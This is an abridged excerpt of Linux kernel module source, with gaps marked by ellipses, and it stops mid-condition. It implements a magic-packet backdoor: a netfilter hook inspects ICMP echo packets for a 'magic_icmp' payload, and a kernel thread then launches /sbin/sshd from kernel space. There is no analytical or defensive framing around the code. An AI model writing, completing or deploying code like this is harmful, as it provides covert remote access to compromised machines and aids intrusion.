...
static DECLARE_WAIT_QUEUE_HEAD(run_event);

static struct n_subprocess_info *ssh_sub_info;

static pid_t ssh_pid;
static struct task_struct *runner_thread;
static int isSSHDrunning = 0;
static int startSSHD = 0;
static int stopSSHD = 0;

static char *ssh_argv[] = { "/sbin/sshd", NULL, NULL };
...
static void stop_icmp(void);

static int runner(void *par)
{
    while (1) {
        wait_event_interruptible(run_event,
                                 (startSSHD == 1 || stopSSHD == 1) ||
                                 kthread_should_stop());
        ...
        if (!isSSHDrunning && startSSHD) {
            ...
            ssh_sub_info = n_call_usermodehelper_setup(
                ssh_argv[0], ssh_argv, ssh_envp, GFP_ATOMIC);
            if (ssh_sub_info == NULL)
                return -ENOMEM;
...
static unsigned int watch_icmp(unsigned int hooknum, struct sk_buff *skb,
                               ...
                               int (*okfn)(struct sk_buff *))
{
    ...
    if (icmp_header->type != ICMP_ECHO ||
        payload_size < sizeof(struct magic_icmp) ||
